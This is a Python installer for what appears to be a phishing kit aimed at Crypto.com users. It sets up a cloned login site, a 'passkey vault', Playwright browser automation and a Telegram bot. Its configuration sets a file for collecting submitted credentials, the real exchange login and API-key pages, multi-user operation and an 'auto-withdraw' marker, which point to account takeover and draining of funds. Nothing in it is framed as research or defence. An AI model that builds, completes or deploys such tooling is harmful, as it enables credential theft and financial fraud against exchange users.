"""
Crypto.com Automation - One-Click Installer
Detects dependencies, installs everything, asks for config.
Run: python install.py
"""

import os, sys, json, subprocess, urllib.request

def log(msg):
    print(f"  {msg}")

def ask(text, default=""):
    v = input(f"  {text}" + (f" [{default}]" if default else "") + ": ").strip()
    return v if v else default

def check_or_install():
    print("\n" + "=" * 50)
    print("  Checking dependencies...")
    print("=" * 50)

    # Refresh PATH (Node.js may have been just installed)
    os.environ["PATH"] = os.environ.get("PATH", "") + os.pathsep + r"C:\Program Files\nodejs"
    os.environ["PATH"] += os.pathsep + os.path.expanduser(r"~\AppData\Roaming\npm")

    # Python
    log(f"Python {sys.version.split()[0]}")

    # Node.js
    try:
        v = subprocess.run("node -v", capture_output=True, text=True, shell=True)
        log(f"Node {v.stdout.strip()}")
    except:
        log("Node.js NOT FOUND. Close & reopen PowerShell, or download from https://nodejs.org")
        return False

    # npm
    try:
        v = subprocess.run("npm -v", capture_output=True, text=True, shell=True)
        log(f"npm {v.stdout.strip()}")
    except:
        log("npm NOT FOUND")
        return False

    # Clone site deps
    log("Installing clone site dependencies...")
    subprocess.run(["npm", "install"], cwd="clone-site", shell=True)

    # Passkey vault deps
    log("Installing passkey vault dependencies...")
    subprocess.run(["npm", "install"], cwd="passkey-vault", shell=True)

    # Playwright
    log("Installing Playwright...")
    subprocess.run([sys.executable, "-m", "pip", "install", "playwright"], shell=True)
    subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], shell=True)

    log("All dependencies installed")
    return True

def configure():
    print("\n" + "=" * 50)
    print("  Configuration Wizard")
    print("=" * 50)
    print()
    print("  Get your bot token from @BotFather on Telegram")
    print("  Create a Telegram channel and add your bot as admin")
    print()

    cfg = {}
    cfg["bot_token"] = ask("Telegram bot token")
    cfg["bot_token_putter"] = cfg["bot_token"]
    cfg["log_chat_id"] = ask("Log channel ID (-100...)")
    cfg["report_chat_id"] = ask("Report channel ID", cfg["log_chat_id"])
    cfg["allowed_chat_ids"] = [cfg["report_chat_id"]]

    print()
    cfg["site_base_url"] = ask("Clone site URL", "http://localhost:3000")

    print()
    print("  Testing connection...")
    try:
        urllib.request.urlopen(cfg["site_base_url"] + "/api/step", timeout=5)
        log("Connection OK")
    except:
        log("WARNING: Could not connect to " + cfg["site_base_url"])
        log("Make sure the dev server is running (npm run dev in clone-site)")

    # Default paths
    cfg["credential_source"] = "both"
    cfg["credential_feed_path"] = "clone-site/data/submissions.jsonl"
    cfg["listener_port"] = 8765
    cfg["exchange_login_url"] = "https://accounts.crypto.com"
    cfg["api_keys_page_url"] = "https://web.crypto.com"
    cfg["bind_ip"] = "auto"
    cfg["headful"] = True
    cfg["use_system_chrome"] = True
    cfg["browser_profile_dir"] = "browser-profile"
    cfg["cdp_port"] = 9222
    cfg["done_marker_path"] = "passkey-vault/auto-withdraw.done"
    cfg["keep_open_timeout_s"] = 3600
    cfg["proxy"] = ""
    cfg["default_timeout_ms"] = 15000
    cfg["multi_user"] = True
    cfg["telegram_long_poll_seconds"] = 30

    # Create data directory
    os.makedirs("clone-site/data", exist_ok=True)

    # Create initial step.json
    with open("clone-site/data/step.json", "w") as f:
        json.dump({"step": "login"}, f)

    # Create submissions.jsonl
    open("clone-site/data/submissions.jsonl", "w").close()

    # Create browser profile directory
    os.makedirs("browser-profile", exist_ok=True)

    # Save config
    with open("config.json", "w") as f:
        json.dump(cfg, f, indent=2)

    print()
    print("=" * 50)
    print("  Setup Complete!")
    print("=" * 50)
    print()
    print("  Run: .\\start-all.bat")
    print("  Then open: " + cfg["site_base_url"] + "/login")

def main():
    print("\n" + "=" * 50)
    print("  Crypto.com Automation - Installer")
    print("=" * 50)

    if not check_or_install():
        print("\n  Install Node.js first: https://nodejs.org")
        sys.exit(1)

    configure()

if __name__ == "__main__":
    main()
